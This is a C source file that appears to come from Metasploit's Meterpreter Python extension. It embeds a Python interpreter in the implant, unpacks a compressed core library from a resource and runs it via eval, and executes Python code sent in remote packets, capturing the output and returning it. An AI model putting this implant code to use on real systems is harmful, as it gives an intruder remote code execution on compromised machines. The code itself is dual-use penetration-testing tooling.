/*!
 * @file python_commands.c
 * @brief Definitions for the python command bindings.
 */
#include "Python.h"
#include "marshal.h"
#include "python_main.h"
#include "python_commands.h"
#include "python_meterpreter_binding.h"
#include "Resource Files/python_core.rh"

///! @brief Struct that contains pointer to init function and name.
typedef struct _InitFunc
{
#ifdef DEBUGTRACE
	PCHAR name;
#endif
	PyMODINIT_FUNC(*func)(void);
} InitFunc;

#ifdef DEBUGTRACE
#define DEC_INIT_FUNC(x) { #x, x }
#else
#define DEC_INIT_FUNC(x) { x }
#endif

// All external python functions we have baked into the runtime which let us deploy
// it as one chunk rather than dynamically loading libs.
extern PyMODINIT_FUNC initerrno(void);
extern PyMODINIT_FUNC init_functools(void);
extern PyMODINIT_FUNC init_socket(void);
extern PyMODINIT_FUNC init_weakref(void);
extern PyMODINIT_FUNC initarray(void);
extern PyMODINIT_FUNC initaudioop(void);
extern PyMODINIT_FUNC init_csv(void);
extern PyMODINIT_FUNC init_io(void);
extern PyMODINIT_FUNC init_multibytecodec(void);
extern PyMODINIT_FUNC init_bisect(void);
extern PyMODINIT_FUNC init_codecs(void);
extern PyMODINIT_FUNC init_collections(void);
extern PyMODINIT_FUNC init_heapq(void);
extern PyMODINIT_FUNC init_locale(void);
extern PyMODINIT_FUNC init_lsprof(void);
extern PyMODINIT_FUNC init_random(void);
extern PyMODINIT_FUNC init_sre(void);
extern PyMODINIT_FUNC init_struct(void);
extern PyMODINIT_FUNC init_weakref(void);
extern PyMODINIT_FUNC initaudioop(void);
extern PyMODINIT_FUNC initbinascii(void);
extern PyMODINIT_FUNC initcmath(void);
extern PyMODINIT_FUNC initcPickle(void);
extern PyMODINIT_FUNC initcStringIO(void);
extern PyMODINIT_FUNC initdatetime(void);
extern PyMODINIT_FUNC initfuture_builtins(void);
extern PyMODINIT_FUNC initgc(void);
extern PyMODINIT_FUNC initimageop(void);
extern PyMODINIT_FUNC inititertools(void);
extern PyMODINIT_FUNC initmath(void);
extern PyMODINIT_FUNC init_md5(void);
extern PyMODINIT_FUNC initmmap(void);
extern PyMODINIT_FUNC initoperator(void);
extern PyMODINIT_FUNC initparser(void);
extern PyMODINIT_FUNC initnt(void);
extern PyMODINIT_FUNC init_sha256(void);
extern PyMODINIT_FUNC init_sha512(void);
extern PyMODINIT_FUNC init_sha(void);
extern PyMODINIT_FUNC initsignal(void);
extern PyMODINIT_FUNC initstrop(void);
extern PyMODINIT_FUNC init_symtable(void);
extern PyMODINIT_FUNC initthread(void);
extern PyMODINIT_FUNC inittime(void);
extern PyMODINIT_FUNC initxxsubtype(void);
extern PyMODINIT_FUNC initzipimport(void);
extern PyMODINIT_FUNC init_subprocess(void);
extern PyMODINIT_FUNC init_winreg(void);
extern PyMODINIT_FUNC initselect(void);
extern PyMODINIT_FUNC initunicodedata(void);
extern PyMODINIT_FUNC init_ctypes(void);
extern PyMODINIT_FUNC initmsvcrt(void);
extern PyMODINIT_FUNC init_ssl(void);
extern PyMODINIT_FUNC init_multiprocessing(void);

/// order of these is actually important
static InitFunc init_funcs[] =
{
	// the functions below that are commented out are invoked prior
	// to the python modules being included.
	//DEC_INIT_FUNC(initerrno),
	//DEC_INIT_FUNC(initnt),
	//DEC_INIT_FUNC(init_socket),
	//DEC_INIT_FUNC(init_functools),
	DEC_INIT_FUNC(initmsvcrt),
	DEC_INIT_FUNC(initselect),
	DEC_INIT_FUNC(init_weakref),
	DEC_INIT_FUNC(initarray),
	DEC_INIT_FUNC(initaudioop),
	DEC_INIT_FUNC(init_csv),
	DEC_INIT_FUNC(init_io),
	DEC_INIT_FUNC(init_multibytecodec),
	DEC_INIT_FUNC(init_bisect),
	DEC_INIT_FUNC(init_codecs),
	DEC_INIT_FUNC(init_collections),
	DEC_INIT_FUNC(init_heapq),
	DEC_INIT_FUNC(init_locale),
	DEC_INIT_FUNC(init_lsprof),
	DEC_INIT_FUNC(init_random),
	DEC_INIT_FUNC(init_sre),
	DEC_INIT_FUNC(init_struct),
	DEC_INIT_FUNC(init_weakref),
	DEC_INIT_FUNC(initaudioop),
	DEC_INIT_FUNC(initbinascii),
	DEC_INIT_FUNC(initcmath),
	DEC_INIT_FUNC(initcStringIO),
	DEC_INIT_FUNC(initcPickle),
	DEC_INIT_FUNC(inittime),
	DEC_INIT_FUNC(initdatetime),
	DEC_INIT_FUNC(initgc),
	DEC_INIT_FUNC(initimageop),
	DEC_INIT_FUNC(inititertools),
	DEC_INIT_FUNC(initfuture_builtins),
	DEC_INIT_FUNC(initmath),
	DEC_INIT_FUNC(init_md5),
	DEC_INIT_FUNC(initmmap),
	DEC_INIT_FUNC(initoperator),
	DEC_INIT_FUNC(initparser),
	DEC_INIT_FUNC(init_sha256),
	DEC_INIT_FUNC(init_sha512),
	DEC_INIT_FUNC(init_sha),
	DEC_INIT_FUNC(initsignal),
	DEC_INIT_FUNC(initstrop),
	DEC_INIT_FUNC(init_symtable),
	DEC_INIT_FUNC(initunicodedata),
	DEC_INIT_FUNC(initthread),
	DEC_INIT_FUNC(initxxsubtype),
	DEC_INIT_FUNC(initzipimport),
	DEC_INIT_FUNC(init_subprocess),
	DEC_INIT_FUNC(init_winreg),
	DEC_INIT_FUNC(init_ctypes),
	DEC_INIT_FUNC(init_ssl),
	DEC_INIT_FUNC(init_multiprocessing),
	DEC_INIT_FUNC(NULL)
};


static LIST* stderrBuffer = NULL;
static LIST* stdoutBuffer = NULL;
static LPBYTE coreLibPointer = NULL;
static DWORD coreLibSize = 0;

static PyObject* handle_write(LIST* target, PyObject* self, PyObject* args)
{
	const char* written = NULL;
	if (PyArg_ParseTuple(args, "s", &written))
	{
		dprintf("[PYTHON] something written to %p: %s", target, written);
		if (target != NULL)
		{
			list_add(target, strdup(written));
		}
	}
	else
	{
		dprintf("[PYTHON] something written to %p (can't parse)", target);
	}
	return Py_BuildValue("");
}

static PyObject* handle_flush(PyObject* self, PyObject* args)
{
	return Py_BuildValue("");
}

static PyObject* handle_stderr(PyObject* self, PyObject* args)
{
	return handle_write(stderrBuffer, self, args);
}

static PyObject* handle_stdout(PyObject* self, PyObject* args)
{
	return handle_write(stdoutBuffer, self, args);
}

///! @brief Defines a hook for catching stdout
static PyMethodDef meterpreter_stdout_hooks[] =
{
	{ "write", handle_stdout, METH_VARARGS, "Write something to stdout" },
	{ "flush", handle_flush, METH_NOARGS, "Flush stdout" },
	{ NULL, NULL, 0, NULL }
};

///! @brief Defines a hook for catching stderr
static PyMethodDef meterpreter_stderr_hooks[] =
{
	{ "write", handle_stderr, METH_VARARGS, "Write something to stderr" },
	{ "flush", handle_flush, METH_NOARGS, "Flush stderr" },
	{ NULL, NULL, 0, NULL }
};

static VOID dump_to_packet(LIST* source, Packet* packet, UINT tlvType)
{
	lock_acquire(source->lock);

	PNODE current = source->start;

	while (current != NULL)
	{
		packet_add_tlv_string(packet, tlvType, (LPCSTR)current->data);
		current = current->next;
	}

	lock_release(source->lock);
}

VOID clear_std_handler(LIST* source)
{
	dprintf("[PYTHON] clearing list %p", source);
	list_clear(source, free);
	dprintf("[PYTHON] cleared list %p", source);
}

VOID initialize_std_handlers()
{
	dprintf("[PYTHON] initializing handlers");
	if (stderrBuffer == NULL)
	{
		stderrBuffer = list_create();
	}
	if (stdoutBuffer == NULL)
	{
		stdoutBuffer = list_create();
	}
	dprintf("[PYTHON] initialized handlers");
}

VOID destroy_std_handlers()
{
	dprintf("[PYTHON] destroying handlers");
	clear_std_handler(stderrBuffer);
	list_destroy(stderrBuffer);
	stderrBuffer = NULL;
	clear_std_handler(stdoutBuffer);
	list_destroy(stdoutBuffer);
	stdoutBuffer = NULL;
	dprintf("[PYTHON] destroyed handlers");
}

/*!
 * @brief Destroy the session.
 */
VOID python_destroy_session()
{
	destroy_std_handlers();
	Py_Finalize();
}

/*!
 * @brief Prepare the session for use, including all the resources that are embedded.
 */
VOID python_prepare_session()
{
	Py_IgnoreEnvironmentFlag = 1;
	Py_NoSiteFlag = 1;
	Py_Initialize();
	PyEval_InitThreads();

	PyObject* stdoutModule = Py_InitModule("meterpreter_stdout", meterpreter_stdout_hooks);

	if (stdoutModule != NULL && PySys_SetObject("stdout", stdoutModule) == 0)
	{
		dprintf("[PYTHON] Successfully set the stdout hook");
	}
	else
	{
		dprintf("[PYTHON] Failed to set the stdout hook");
	}

	PyObject* stderrModule = Py_InitModule("meterpreter_stderr", meterpreter_stderr_hooks);
	if (stderrModule != NULL && PySys_SetObject("stderr", stderrModule) == 0)
	{
		dprintf("[PYTHON] Successfully set the stderr hook");
	}
	else
	{
		dprintf("[PYTHON] Failed to set the stderr hook");
	}

	// with the output handlers sorted, we load the stuff from the compressed resource
	// which should give us all the stuff we need to be useful.
	initerrno();
	initnt();
	init_socket();
	init_functools();
	
	// have we loaded the core pointer already?
	if (coreLibPointer == NULL)
	{
		MEMORY_BASIC_INFORMATION mbi;
		if (!VirtualQuery((LPVOID)python_prepare_session, &mbi, sizeof(mbi)))
		{
			dprintf("[PYTHON] VirtualQuery failed: %d", GetLastError());
			return;
		}

		HMODULE mod = (HMODULE)mbi.AllocationBase;
		dprintf("[PYTHON] Module handle: %p", (LPVOID)mod);

		HRSRC res = FindResource(mod, MAKEINTRESOURCEA(IDR_PYTHON_CORE), "BINARY");
		if (res == NULL)
		{
			dprintf("[PYTHON] Unable to find resource: %d", GetLastError());
			return;
		}

		HGLOBAL file = LoadResource(mod, res);

		if (file == NULL)
		{
			dprintf("[PYTHON] Unable to load core library resource: %d", GetLastError());
			return;
		}

		// store these pointers for when we reset the session, saves us from
		// doing all of this nonsense again.
		coreLibPointer = (LPBYTE)LockResource(file);
		coreLibSize = *(LPDWORD)coreLibPointer;
		coreLibPointer += sizeof(DWORD);
	}

	dprintf("[PYTHON] coreLibPointer: %p, coreLibSize: %d", coreLibPointer, coreLibSize);

	if (coreLibPointer != NULL)
	{
		// Create a byte array with everything in it
		PyObject* libString = PyString_FromStringAndSize(coreLibPointer, coreLibSize);
		dprintf("[PYTHON] libString is %p", libString);

		// import zlib
		PyObject* zlibModStr = PyString_FromString("zlib");
		dprintf("[PYTHON] zlibModStr: %p", zlibModStr);
		PyObject* zlibMod = PyImport_Import(zlibModStr);
		dprintf("[PYTHON] zlibMod: %p", zlibMod);
		// get a reference to the decompress function
		PyObject* zlibDecompress = PyObject_GetAttrString(zlibMod, "decompress");
		dprintf("[PYTHON] zlibDecompress: %p", zlibDecompress);
		// prepare arguments for invocation
		PyObject* zlibDecompressArgs = PyTuple_Pack(1, libString);
		dprintf("[PYTHON] zlibDecompressArgs: %p", zlibDecompressArgs);
		// call zlib.decompress(libString)
		PyObject* zlibDecompressResult = PyObject_CallObject(zlibDecompress, zlibDecompressArgs);
		dprintf("[PYTHON] zlibDecompressResult: %p", zlibDecompressResult);
		//dprintf("[PYTHON] zlibDecompressResult type: %s", zlibDecompressResult->ob_type->tp_name);

		PCHAR byteArray = NULL;
		Py_ssize_t byteArrayLength = 0;
		PyString_AsStringAndSize(zlibDecompressResult, &byteArray, &byteArrayLength);
		dprintf("[PYTHON] bytes: %p %u", byteArray, byteArrayLength);

		PyObject* modData = PyMarshal_ReadObjectFromString(byteArray, byteArrayLength);
		dprintf("[PYTHON] modData: %p", modData);

		PyObject* mainMod = PyImport_AddModule("__main__");
		PyObject* mainDict = PyModule_GetDict(mainMod);
		PyModule_AddObject(mainMod, "met_lib_data", modData);
		// TODO: double-check that we don't need to remove existing finders which might
		// hit the file system
#ifdef DEBUGTRACE
		PyRun_SimpleString("eval(met_lib_data[0]);met_init(True)");
#else
		PyRun_SimpleString("eval(met_lib_data[0]);met_init(False)");
#endif

		// TODO: figure out which reference counts need to be reduce to avoid leaking.
	}

	// now load the baked-in modules
	PyErr_Clear();
	for (InitFunc* f = &init_funcs[0]; f->func != NULL; f += 1)
	{
		dprintf("[PYTHON] Running %s", f->name);
		f->func();
		if (PyErr_Occurred())
		{
#ifdef DEBUGTRACE
			PyErr_Print();
#endif
			dprintf("[PYTHON] %s errored", f->name);
			PyErr_Clear();
		}
	}

	initialize_std_handlers();
	binding_init();
}

/*!
 * @brief Reset/restart the interpreter.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_python_reset(Remote* remote, Packet* packet)
{
	dprintf("[PYTHON] resetting the interpreter");
	destroy_std_handlers();
	Py_Finalize();
	Py_Initialize();
	python_prepare_session();
	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);

	return ERROR_SUCCESS;
}

VOID python_execute(CHAR* modName, LPBYTE pythonCode, DWORD codeLength, UINT codeType, CHAR* resultVar, Packet* responsePacket)
{
	PyObject* mainModule = PyImport_AddModule("__main__");
	PyObject* mainDict = PyModule_GetDict(mainModule);

	if (pythonCode != NULL)
	{
		if (codeType == PY_CODE_TYPE_STRING)
		{
			dprintf("[PYTHON] attempting to run string: %s", pythonCode);

			PyRun_SimpleString(pythonCode);
		}
		else
		{
			dprintf("[PYTHON] module name: %s", modName);
			if (modName)
			{
				PyObject* pyModName = PyString_FromString(modName);
				PyModule_AddObject(mainModule, "met_mod_name", pyModName);
			}

			if (codeType == PY_CODE_TYPE_PY)
			{
				dprintf("[PYTHON] importing .py file");

				PyObject* pyModBody = PyString_FromString(pythonCode);
				PyModule_AddObject(mainModule, "met_mod_body", pyModBody);
			}
			else
			{
				dprintf("[PYTHON] importing .pyc file");
				// must be a pyc file
				PyObject* pyModBody = PyString_FromStringAndSize(pythonCode, codeLength);
				dprintf("[PYTHON] myModBody %p: %s", pyModBody, pyModBody->ob_type->tp_name);
				PyModule_AddObject(mainModule, "met_mod_body", pyModBody);
			}

			dprintf("[PYTHON] executing import, GO GO GO !");
			PyRun_SimpleString("met_import_code()");
		}

		if (resultVar && responsePacket)
		{
			PyObject* result = PyDict_GetItemString(mainDict, resultVar);
			if (result != NULL)
			{
				if (PyString_Check(result))
				{
					// result is already a string
					packet_add_tlv_string(responsePacket, TLV_TYPE_EXTENSION_PYTHON_RESULT, PyString_AsString(result));
				}
				else
				{
					PyObject* resultStr = PyObject_Str(result);
					packet_add_tlv_string(responsePacket, TLV_TYPE_EXTENSION_PYTHON_RESULT, PyString_AsString(resultStr));
					Py_DECREF(resultStr);
				}
			}
		}
	}
}

/*!
 * @brief Execute a block of python given in a string and return the result/output.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_python_execute(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	LPBYTE pythonCode = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PYTHON_CODE);

	PyObject* mainModule = PyImport_AddModule("__main__");
	PyObject* mainDict = PyModule_GetDict(mainModule);

	if (pythonCode != NULL)
	{
		UINT codeType = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PYTHON_CODE_TYPE);
		CHAR* modName = packet_get_tlv_value_string(packet, TLV_TYPE_EXTENSION_PYTHON_NAME);
		UINT pythonCodeLength = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PYTHON_CODE_LEN);
		CHAR* resultVar = packet_get_tlv_value_string(packet, TLV_TYPE_EXTENSION_PYTHON_RESULT_VAR);
		python_execute(modName, pythonCode, pythonCodeLength, codeType, resultVar, response);

		dump_to_packet(stderrBuffer, response, TLV_TYPE_EXTENSION_PYTHON_STDERR);
		clear_std_handler(stderrBuffer);
		dump_to_packet(stdoutBuffer, response, TLV_TYPE_EXTENSION_PYTHON_STDOUT);
		clear_std_handler(stdoutBuffer);

		packet_transmit_response(dwResult, remote, response);
	}

	return dwResult;
}